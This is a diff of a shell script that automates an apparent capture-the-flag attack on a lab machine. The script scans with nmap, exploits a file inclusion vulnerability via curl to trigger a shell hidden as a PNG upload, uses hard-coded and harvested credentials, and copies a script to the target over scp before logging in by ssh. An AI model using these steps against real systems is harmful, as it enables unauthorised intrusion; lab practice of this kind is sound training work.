@@ -4,7 +4,7 @@
 script=$(readlink -f $0)
 scriptpath=`dirname $script`
 
-# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
+# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
 target_ip="10.10.59.15"
 attack_ip="10.10.36.217"
 
@@ -12,7 +12,7 @@ attack_ip="10.10.36.217"
 mkdir /work/
 
 # Scan all ports using nmap
-nmap --script vuln -sC -sV -p- ${target_ip} > /work/nmap-results.txt
+nmap --script vuln -sC -sV -p- -T4 ${target_ip} > /work/nmap-results.txt
 
 # Analyze http server 
 ${scriptpath}/gobuster.sh -u ${target_ip} -p 1337 -o /work/gobuster-apache-results.txt
@@ -49,7 +49,7 @@ base64 -d /work/index3.php > /work/index4.php
 # Launch the shell using the File Injection vulnerability
 curl -X POST http://${target_ip}:1337//file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/lolcat.png -d "password=easytohack"  > /tmp/start.html
 # From the /home/ssh/ssh-creds.txt : with password easytohack@123
-scp ${scriptpath}/host.sh zeamkish@$target_ip:/home/zeamkish/
+scp ${scriptpath}/target.sh zeamkish@$target_ip:/home/zeamkish/
 ssh ${target_ip} -l zeamkish -p 22
 
 
